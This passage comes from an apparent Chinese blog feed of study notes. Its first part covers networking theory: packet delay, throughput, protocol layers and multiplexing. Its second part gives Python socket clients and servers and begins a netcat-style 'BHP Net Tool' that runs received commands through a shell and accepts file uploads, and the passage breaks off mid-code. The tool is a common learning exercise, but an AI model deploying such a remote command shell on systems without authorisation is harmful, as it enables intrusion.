</ul></li>
<li>第二次ISP，区域性的ISP
<ul>
<li>与一个或多个第一层ISP相连</li>
<li>也可能与其他第二层ISP相连</li>
</ul></li>
<li>第三层ISP与其他本地ISP
<ul>
<li>可以理解为接入网</li>
</ul></li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530090211.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530091556.png" /></p>
<h1 id="分组丢失延时和吞吐量">4. 分组丢失、延时和吞吐量</h1>
<h2 id="分组丢失和延时的产生">4.1. 分组丢失和延时的产生</h2>
<p>我们知道，分组交换中，路由器具有存储-转发的功能。存储意味着路由器要保存接收到的分组，那么路由器该如何确定发送分组的先后顺序呢？因此，路由器会维护一个队列，将接收到的分组依次入队，然后从队头拿一个分组转发出去。<strong>这里就产生了一个时延：排队时延</strong>。</p>
<p>队列是有长度限制的呀，当某一个时刻，队列满的时候再来一个分组，路由器只能够将其丢弃，这就是分组丢失。</p>
<p>问题：为什么不能将队长设置的大一点呢？</p>
<p>其实很简单，假设队列长度无限，那么路由器会接收所有的分组，假设A发了一个分组，这个分组在路由器内排队，排了好几天，终于发出去了，此时这个分组成功达到目的。试问，你发一条微信，3天后对方才收到，那么这条微信还有必要吗？快递都忍不了3天，更何况微信呢。因此，无限长的队列虽然能保证分组不丢失，但是没有意义了。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530092408.png" /></p>
<h2 id="四种分组时延">4.2. 四种分组时延</h2>
<p>除了刚刚说的排队时延之外，还有3个时延。因此一共有如下4种分组时延：</p>
<ol type="1">
<li><strong>节点处理时延</strong>：检测bit级错误，检查分组首部和决定将分组导向何处所花费的时间；</li>
<li><strong>排队时延</strong>：在输出队列等待传输的时间；</li>
<li><strong>传输时延</strong>：将分组发送到链路上的时间；</li>
<li><strong>传播时延</strong>：分组在链路上传播的时间；</li>
</ol>
<p>1，2，4比较好理解，这里的传输时延解释一下。假设分组的长度为 <span
class="math inline">\(L=10kbits\)</span>，而链路带宽 <span
class="math inline">\(R=1kbps\)</span>，那么这个分组是不是1s只发送了1kbits，那么将整个分组从路由器发出到链路上需要10s，这就是传输时延。因此，<span
class="math inline">\(传输时延=L/R\)</span></p>
<p>打个人性化的比喻：一辆火车（一个分组）进入一个隧道（链路），火车头进入隧道，不代表整辆火车进入隧道，那么从火车头进入隧道到火车尾进入隧道的时间就是传输时延。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530093539.png" /></p>
<p>假设链路的长度为 d，媒体上的传播速度为 s，那么 <span
class="math inline">\(传播时延=d/s\)</span></p>
<p>因此，节点延时的公式如下：</p>
<p><span class="math display">\[
d_{nodal}=d_{proc}+d_{queue}+d_{trans}+d_{prop}
\]</span></p>
<ul>
<li><span class="math inline">\(d_{proc}\)</span>：处理时延</li>
<li><span class="math inline">\(d_{queue}\)</span>：排队时延</li>
<li><span class="math inline">\(d_{trans}\)</span>：传输时延</li>
<li><span class="math inline">\(d_{prop}\)</span>：传播时延</li>
</ul>
<p>有一个概念：流量强度。<span
class="math inline">\(流量强度=La/R\)</span></p>
<ul>
<li>R：链路带宽(bps)</li>
<li>L：分组长度(bits)</li>
<li>a：分组到达队列的平均速率</li>
</ul>
<p>流量强度越小，平均排队时延越小，当流量强度接近1时，平均排队时延趋近于无穷。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530094319.png" /></p>
<p>排队时延的公式：<span class="math inline">\(d_{queue}=\frac I{1-I} *
\frac LR\)</span></p>
<h2 id="吞吐量">4.3. 吞吐量</h2>
<p><strong>吞吐量</strong>：源端和目标端之间传输的速率（数据量/单位时间）</p>
<ul>
<li>瞬间吞吐量：在一个个时间点的速率</li>
<li>平均吞吐量：在于给长时间内的平均值</li>
</ul>
<p>大致分为两种情况：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530094615.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530094623.png" /></p>
<p>前者的吞吐量为 <span class="math inline">\(R_s\)</span>，后者为 <span
class="math inline">\(R_c\)</span>。这是因为<strong>瓶颈链路</strong></p>
<p><strong>瓶颈链路</strong>：端到端路径上，限制端到端吞吐的链路。</p>
<p>因此</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530094735.png" /></p>
<p>当然，实际上不可能这么简单，因为所有的链路都是大家共享的</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530094812.png" /></p>
<p>因此，此时的吞吐量为 <span class="math inline">\(min(R_c, R_s,
R/10)\)</span>。实际上 <span class="math inline">\(R_s\)</span> 或者
<span class="math inline">\(R_c\)</span> 才是瓶颈。</p>
<h1 id="协议层次及服务模型">5. ⭐协议层次及服务模型</h1>
<h2 id="服务和协议">5.1. 服务和协议</h2>
<p><strong>功能</strong>：层实体具有的能力。</p>
<p><strong>服务</strong>：低层实体向上层实体提供的功能。因此，服务是功能的子集。</p>
<ul>
<li>服务用户（service user）</li>
<li>服务提供者（service provider）</li>
</ul>
<p><strong>原语(primitive)</strong>：上层使用下层服务的形式，高层使用底层提供的服务，以及低层向高层提供服务都是通过服务访问源于来进行交互的（可以理解为某个函数）</p>
<p><strong>服务访问点(SAP, Services Access
Point)</strong>：上层使用下层提供的服务通过层间的接口</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530101356.png" /></p>
<p>上层的IDU通过SAP到达下层，下层将ICI和SDU分离，然后将SDU和本层的头部信息组成PDU然后向发给下层。</p>
<h3 id="服务的类型">5.1.1. 服务的类型</h3>
<ol type="1">
<li>面向连接的服务(Connection-oriented Service)
<ul>
<li>特点：保序、可靠</li>
<li>适合范围：大的数据块传输</li>
</ul></li>
<li>无连接的服务(Connectionless Service)
<ul>
<li>特点：不可靠，可能重复，可能失序</li>
<li>适用范围：适合传送零星数据</li>
</ul></li>
</ol>
<h3 id="服务和协议-1">5.1.2. 服务和协议</h3>
<p>区别：</p>
<ol type="1">
<li>服务：低层实体向上层实体提供的功能。通过原语来操作，所以是<strong>垂直的</strong></li>
<li>协议(protocol)：对等层实体(peer
entity)之间在相互通信的过程中，需要遵循的规则的集合，所以是<strong>水平的</strong>。</li>
</ol>
<p>联系：</p>
<ol type="1">
<li>本层的协议的实现需要靠下层提供的服务实现（物理层除外）</li>
<li>本层实体通过协议为上层提供<strong>更高级的服务</strong>，不是简单的将下层的数据转发，而是会添加本层特有的信息。</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220618093013.png" /></p>
<h2 id="tcpip协议簇">5.2. TCP/IP协议簇</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530101809.png" /></p>
<p><strong>物理层</strong>：把数字信号转为物理信号，然后通过介质传输给对方，对方把物理信号转为数字信号</p>
<ul>
<li>单位：位(bit)</li>
<li>特点：p2p (point to point)</li>
</ul>
<p><strong>链路层</strong>：在物理层的服务之上，在相邻的节点之间传输以帧为单位的数据</p>
<ul>
<li>单位：帧(frame)</li>
<li>特点：p2p (point to point)</li>
</ul>
<p><strong>网络层</strong>：在链路层的服务之上，在端到端之间传输以分组为单位的数据</p>
<ul>
<li>单位：
<ul>
<li>面向连接：分组(packet)</li>
<li>无连接：数据报(datagram)</li>
</ul></li>
<li>特点：e2e (end to end)</li>
</ul>
<p><strong>传输层</strong>：在网络层的服务之上，进一步将e2e的数据区分到进程到进程。将不可靠通信变成可靠通信</p>
<ul>
<li>单位：报文段(segment)</li>
<li>特点：进程到进程，可靠</li>
</ul>
<p><strong>应用层</strong>：实现各种网络应用</p>
<ul>
<li>单位：报文(message)</li>
</ul>
<blockquote>
<p>单位就是协议的体现。如果相同层次支持相同的协议，那么它们在本层使用的单位相同，并且能够理解单位中每个字段的意思。</p>
</blockquote>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530101342.png" /></p>
<p>通过分层，就会出现逻辑上和实际的连接。逻辑上：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530104328.png" /></p>
<p>实际上：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530104352.png" /></p>
<h2 id="isoosi参考模型">5.3. ISO/OSI参考模型</h2>
<p>ISO：Internetional Organization for Standardization</p>
<p>OSI：Open Sytems Interconnection</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530103957.png" /></p>
<p><strong>表示层</strong>：允许应用解释传输的数据，比如加密，压缩，机器相关的表示转换</p>
<p><strong>会话层</strong>：数据交换的同步，检查，恢复</p>
<p>这两层的功能如果需要，必须由应用程序自个实现。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530104445.png" /></p>
<p>为什么 OSI 没有成功：</p>
<ul>
<li>因为 TCP/IP 比较早，如果要实现
OSI，相当于之前的成本全部都打水漂了；</li>
<li>OSI 效率不高</li>
</ul>
<h2 id="分层实现复杂系统">分层实现复杂系统</h2>
<p><strong>概念化</strong>：结构清晰，便于标示网络组件，以及描述其相互关系</p>
<p><strong>结构化</strong>：模块化更易于维护和系统升级</p>
<ul>
<li>改变某一层服务的实现不影响系统中其他层次</li>
<li>如果某一层的设备坏了，只需要换一个设备就好了。如果不分层，则需要整套系统换掉</li>
</ul>
<p>当然也有一定的弊端，那就是效率肯定没有直接实现全部的功能的方式高。</p>
<h1 id="其他知识">6. 其他知识</h1>
<h2 id="多路复用与多路分解">6.1. 多路复用与多路分解</h2>
<p>由于 TCP/IP
协议簇在一些层次会使用多个协议，因此需要在源端进行多路复用(multiplexing)，在目的端需要尽心多路分解。</p>
<p>在这种情况下，多路复用指的是一个协议能够封装来自上层不同协议的分组；多路分解指的是一个协议能够解封装，并且将多个分组投递到上层不同协议。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530105858.png" /></p>
<p>为了实现这个功能，协议需要一个用于表示被封装的分组属于哪个协议的头部字段。</p>
<h3 id="电路交换中的多路复用">6.1.1. 电路交换中的多路复用</h3>
<p>多路复用：</p>
<ul>
<li>将网络资源分片</li>
<li>将资源片分配给“呼叫”(calls)</li>
<li>每路呼叫独占资源片</li>
<li>资源片可能闲置（独享）</li>
</ul>
<p>典型的多路复用方法：</p>
<ul>
<li>FDM</li>
<li>TDM</li>
<li>CDM</li>
<li>WDM</li>
</ul>
<p>FDM
就是用户占用不同的带宽资源（这里的“带宽”是频率带宽（单位：Hz）而不是数据的发送速率）。用户在分配到一定的频带后，在通信过程中自始至终都占用这个频道。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530111618.png" /></p>
<p>TDM
将时间划分为一段段等长的时分复用帧（TDM帧），每个用户在每个TDM帧中占用固定序号的时隙。每个用户所占用的时隙是周期性出现（其周期就是TDM帧的长度）。时分复用的所有用户是在不同的时间占用相同的频带宽度。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530111749.png" /></p>
<p>A, B, C, D 代表不同用户</p>
<p>WDM 光的频分多路复用。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530111814.png" /></p>
<p>CDM ：</p>
<ul>
<li><p>广泛应用于无线链路共享</p></li>
<li><p>每个用户分配一个唯一的 m bit 码片序列(chipping
sequence)，其中“0”用“-1”表示，“1”用“+1”表示。</p>
<blockquote>
<p>发送比特1（+1），则发送自己的 m bit 码片序列
发送比特0（-1），则发送该码片序列的 m bit 码片序列的反码</p>
</blockquote></li>
<li><p>由于各用户既不分割频率，也不分割时间，各用户使用<strong>相同频率</strong>载波，利用各自码片序列编码数据。</p></li>
<li><p>编码信号=原始数据×码片序列</p></li>
<li><p>由于每个用户所用频率相同，故每个用户发送的信息在信道中必然相互叠加，为了让信息之间互不干扰，各用户码片序列必须满足<strong>相互正交</strong>。</p>
<blockquote>
<p>一个用户的码片序列只有与自己相乘时得1，与其他码片序列相乘都为0
一个用户的码片序列只有与自己的反码相乘时的-1，与其他码片序列的反码相乘都为0</p>
</blockquote></li>
</ul>
<p><span class="math display">\[
(1/m)S_i·S_j= \begin{cases}  
1 &amp; i = j \\
0 &amp; i \neq j
\end{cases}
\]</span></p>
<p><span class="math display">\[
(1/m)S_i·\overline S_j= \begin{cases}  
-1 &amp; i = j \\
0 &amp; i \neq j
\end{cases}
\]</span></p>
<p>如果 <span class="math inline">\(d_i\)</span>
为原始数据序列，各用户叠加的向量为，即编码过程：</p>
<p><span class="math display">\[
P=\sum_{i=1}^Nd_i·S_i
\]</span></p>
<p>解码过程：计算码片序列与编码信号的内积，根据所得结果，判断此刻信道中是否有该用户的信息传输。</p>
<p><span class="math display">\[
(1/m)S_i·P= \begin{cases}
1 &amp; S_i \in P \\
-1 &amp; \overline S_i \in P \\
0 &amp; S_i, \overline S_i \notin P
\end{cases}
\]</span></p>
<h2 id="面向连接和有连接的区别">6.2. 面向连接和有连接的区别</h2>
<p><strong>面向连接</strong>：端系统知道自己与另一个端系统建立了“连接”。但是对于路由器等连接设备来说，没有这么一回事。实际上，对于数据的转发还是与其他共享资源，只是通过下层的服务，使端系统认为存在一个“连接”。</p>
<p><strong>有连接</strong>：端系统知道自己与另一个端系统建立了来连接，并且路由器等连接设备也确实为这两个端系统之间的通信预留了网络资源供使用。此时这两个端系统之间的通信独占网络资源。</p>
<ul>
<li>既有端到端的连接</li>
<li>也有网络层的连接[[第4章 网络层：数据平面#1 5 连接建立]]</li>
</ul>
]]></content>
      <categories>
        <category>计算机基础</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>计算网络教程 自顶向下方法</tag>
        <tag>B站中科大计网</tag>
      </tags>
  </entry>
  <entry>
    <title>第 1 章 网络基础</title>
    <url>/2022/06/14/%E7%AC%AC%201%20%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>个人的知识笔记。</p>
<span id="more"></span>
<h1 id="tcp客户端">1. TCP客户端</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">serverHost = <span class="string">&quot;www.baidu.com&quot;</span></span><br><span class="line">serverPort = <span class="number">80</span></span><br><span class="line"></span><br><span class="line">client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client.connect((serverHost, serverPort))</span><br><span class="line">client.send(<span class="string">&quot;GET / HTTP/1.1\r\nHost: baidu.com\r\n\r\n&quot;</span>.encode())</span><br><span class="line">resp = client.recv(<span class="number">4096</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.decode())</span><br></pre></td></tr></table></figure>
<p>首先，创建一个包含 AF_INET 和 SOCK_STREAM 的TCP
socket对象。前者表明接下来使用的地址是IPv4地址或者主机名；后者表示是基于TCP的。</p>
<p>然后，因为 send 函数发送的是Byte型，所以字符串需要使用 encode
方法。同样的，最后接收到的也是 Byte
型，所以如果需要打印字符串的话就在最后面加上 decode。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220610215452.png" /></p>
<p>这个代码段是比较简单的：</p>
<ol type="1">
<li>假设TCP请求一定成功</li>
<li>假设服务器总是期望客户端首先发送数据</li>
<li>假设服务器总是能够及时返回数据</li>
</ol>
<p>因此，少了一些对异常处理的细节。但是平常写的工具确实不需要这些细节。因此后面除非必要，都会忽略这些异常处理。</p>
<h1 id="udp客户端">2. UDP客户端</h1>
<p>UDP客户端和TCP客户端相差不大，整体的逻辑差不多，不过有3处需要注意：</p>
<ol type="1">
<li>创建socket对象的时候需要使用 SOCK_DGRAM</li>
<li>不需要建立连接，也就是不需要 connect 函数</li>
<li>发送数据的时候需要带上目标地址，因此需要使用 sendto
函数；同样的接收数据的时候返回的其实是 (data, addr)，因此需要使用
recvfrom 函数来接收</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">serverHost = <span class="string">&quot;10.0.2.21&quot;</span></span><br><span class="line">serverPort = <span class="number">3333</span></span><br><span class="line"></span><br><span class="line">client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">client.sendto(<span class="string">&quot;hello world&quot;</span>, (serverHost, serverPort))</span><br><span class="line">data, addr = client.recvfrom(<span class="number">4096</span>)</span><br><span class="line"><span class="built_in">print</span>(data.decode(), addr)</span><br></pre></td></tr></table></figure>
<p>我开了另一台虚拟机，运行了一个UDP服务器，作用是“接收来自客户端的数据，并将其转为大写，然后回复给客户端”。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220610215506.png" /></p>
<h1 id="tcp服务器">3. TCP服务器</h1>
<p>创建一个多线程的TCP服务器，代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">bindPort = <span class="number">4445</span></span><br><span class="line"></span><br><span class="line">server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">server.bind((<span class="string">&#x27;&#x27;</span>, bindPort))</span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Listening on %s:%d&quot;</span> % (<span class="string">&#x27;0.0.0.0&#x27;</span>, bindPort))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_client</span>(<span class="params">clientSocket</span>):</span></span><br><span class="line">	req = clientSocket.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*] Received: %s&quot;</span> % req)</span><br><span class="line">	clientSocket.send(<span class="string">&#x27;ACK!&#x27;</span>)</span><br><span class="line">	clientSocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	client, addr = server.accept()</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*] Accept connection fron %s:%d&quot;</span> % (addr[<span class="number">0</span>], addr[<span class="number">1</span>]))</span><br><span class="line">	clientHandler = threading.Thread(target = handle_client, args = (client,))</span><br><span class="line">	clientHandler.start()</span><br></pre></td></tr></table></figure></p>
<p>这里有几个地方解释一下：</p>
<ol type="1">
<li>bind, listen 这些函数的作用可以看 [[socket]]</li>
<li>这是一个多线程，也就是可以同时支持5个用户的TCP连接，但是这5个TCP
socket对象（通信使用的）是不一样的</li>
</ol>
<p>将之前的TCP客户端稍作修改，改了服务器地址和要发送的内容</p>
<p>客户端的结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220610221003.png" /></p>
<p>服务器的结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220610221034.png" /></p>
<h1 id="udp服务器">4. UDP服务器</h1>
<p>就用在UDP客户端中提到的代码展示以下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">port = <span class="number">3333</span></span><br><span class="line">serverSocket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">serverSocket.bind((<span class="string">&#x27;&#x27;</span>, port))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The server is ready to receive.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    message, clientAddress = serverSocket.recvfrom(<span class="number">4096</span>)</span><br><span class="line">    modifiedMessage = message.decode().upper()</span><br><span class="line">    serverSocket.sendto(modifiedMessage.encode(), clientAddress)</span><br></pre></td></tr></table></figure></p>
<h1 id="取代netcat">5. 取代netcat</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># global variables </span></span><br><span class="line">listen = <span class="literal">False</span></span><br><span class="line">command = <span class="literal">False</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line">uploadDestination = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>上面的代码是准备工作，先导入需要的python库，并设置了一些全局变量。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用说明</span></span><br><span class="line"><span class="comment"># 使用说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]BHP Net Tool&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: bhnet.py -t targetHost -p port&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-l --listen\t- listen on [host]:[port] for incoming connections&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-c --command\t- initialize a command shell&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-u --upload=destination\t- upon receiving connection upload a file and write to [destination]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Examples: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bhpnet.py -t 192.168.0.1 -t 5555 -l -c&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bhpnet.py -t 192.168.0.1 -t 5555 -l -u /home/miku/text.txt&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;echo &#x27;ABCDEFGHI&#x27; | ./bhpnet.py -t 192.168.11.12 -p 135&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> listen</span><br><span class="line">    <span class="keyword">global</span> command </span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> uploadDestination</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(sys.argv[<span class="number">1</span>:]): <span class="comment"># 如果没输入参数，则显示使用说明</span></span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取命令行选项</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">&quot;hlt:p:cu:&quot;</span>, [<span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;listen&#x27;</span>, <span class="string">&#x27;execute=&#x27;</span>, <span class="string">&#x27;target=&#x27;</span>, <span class="string">&#x27;port=&#x27;</span>, <span class="string">&#x27;command&#x27;</span>, <span class="string">&#x27;upload=&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(err))</span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析命令行选项</span></span><br><span class="line">    <span class="keyword">for</span> o, v <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;--help&#x27;</span>):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&#x27;-l&#x27;</span>, <span class="string">&#x27;--listen&#x27;</span>):</span><br><span class="line">            listen = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--target&#x27;</span>):</span><br><span class="line">            target = v</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>):</span><br><span class="line">            port = <span class="built_in">int</span>(v)</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--command&#x27;</span>):</span><br><span class="line">            command = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--upload&#x27;</span>):</span><br><span class="line">            uploadDestination = v</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">assert</span> <span class="literal">False</span>, <span class="string">&quot;Unhandled Option&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> <span class="built_in">len</span>(target) <span class="keyword">and</span> port &gt; <span class="number">0</span>: <span class="comment"># 没在监听，有目标地址，有端口号 -&gt; 发送数据</span></span><br><span class="line">        client_sender() <span class="comment"># 发送数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> listen:</span><br><span class="line">        server_loop()</span><br></pre></td></tr></table></figure>
<p><code>main()</code>首先读取所有的参数，然后解析参数的意思。如果接下来需要发送数据，则先从标准输入读取数据，然后发送，发送需要建立socket；如果是监听模式，那么需要建议一个监听socket，准备处理下一步的命令，如上传文件、执行命令、反弹shell等。</p>
<blockquote>
<p><code>sys.stdin.readlines</code>返回值是一个列表，列表的元素是标准输入的每一行。默认为字符串。因此输入完毕之后需要以EOF为结尾，按
<code>ctrl+D</code> 组合键可以发送EOF指令。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_sender</span>():</span></span><br><span class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        client.connect((target, port))</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buff = <span class="built_in">input</span>(<span class="string">&quot;BHP tool #: &quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27; &#x27;</span> == buff:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            client.send(buff.encode())</span><br><span class="line">            data = client.recv(<span class="number">4096</span>).decode()</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Exception! Exiting. &quot;</span> + <span class="built_in">str</span>(err))</span><br><span class="line"></span><br><span class="line">    client.close()</span><br></pre></td></tr></table></figure>
<p>上面代码比较简单，就是新建一个socket，然后连接目标socket，发送数据，等待响应。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span>():</span></span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(target):</span><br><span class="line">        target = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line"></span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.bind((target, port))</span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, addr = server.accept()</span><br><span class="line">        client_thread = threading.Thread(target=client_handler, args=(client_socket,))</span><br><span class="line">        client_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span>(<span class="params">command</span>):</span></span><br><span class="line">    command = command.rstrip()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output = subprocess.check_output(command, stderr = subprocess.STDOUT, shell = <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        output = <span class="string">&quot;Failed to execute command.\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>
<p><code>server_loop</code> 函数没有什么好多介绍的。主要介绍一下
<code>run_command</code> 函数，该函数中使用了 subprocess
库。这个库提供了进程创建接口，可以提供多种与客户端程序交互的方法。在该函数中，我们作为服务器运行了用户输入的
command，然后通过连接将结果返回到客户端。异常处理代码用来处理一般的错误并将错误信息回传。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_handler</span>(<span class="params">client_socket</span>):</span></span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    <span class="keyword">global</span> uploadDestination</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 上传文件</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(uploadDestination):</span><br><span class="line">        data = client_socket.recv(<span class="number">1024</span>).decode()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(uploadDestination, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> 